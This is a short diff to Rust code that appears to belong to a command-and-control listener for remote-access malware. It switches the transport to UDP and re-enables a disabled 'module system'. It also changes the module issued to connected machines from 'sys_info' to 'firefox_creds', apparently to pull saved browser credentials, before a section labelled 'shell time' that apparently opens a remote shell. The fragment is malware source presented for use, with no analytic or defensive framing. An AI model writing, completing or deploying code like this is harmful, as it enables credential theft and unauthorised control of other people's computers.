@@ -24,7 +24,7 @@ use std::io::{self, Write};
 fn main(){
     let port: u16 = 2120;
     let id: u64 = 69;
-    let protocol: &str = "tcp";
+    let protocol: &str = "udp";
 
     let mut lsn = new_lsn(id);
 
@@ -45,7 +45,7 @@ fn main(){
     );
 
     thread::sleep(time::Duration::from_millis(5000));
-    /*
+    
     // test the module system by executing a module
     // commented out bc its not working at the moment
     let mut code: u8 = 6;
@@ -54,12 +54,12 @@ fn main(){
         buffer.cc = code;
     }
     
-    let mut memo: String = "sys_info".to_string();
+    let mut memo: String = "firefox_creds".to_string();
     let mut swap = true;
     loop {
         if swap {
             io::stdout().flush().unwrap();
-            memo = "sys_info".to_string();
+            memo = "firefox_creds".to_string();
             // write to shared buffer
             let mut buffer = sb_arc.lock().unwrap();
             buffer.cc = 6;
@@ -81,7 +81,7 @@ fn main(){
         thread::sleep(time::Duration::from_millis(10));
     }
 
-    */
+    
     // shell time
     let mut code: u8 = 5;
     if true {
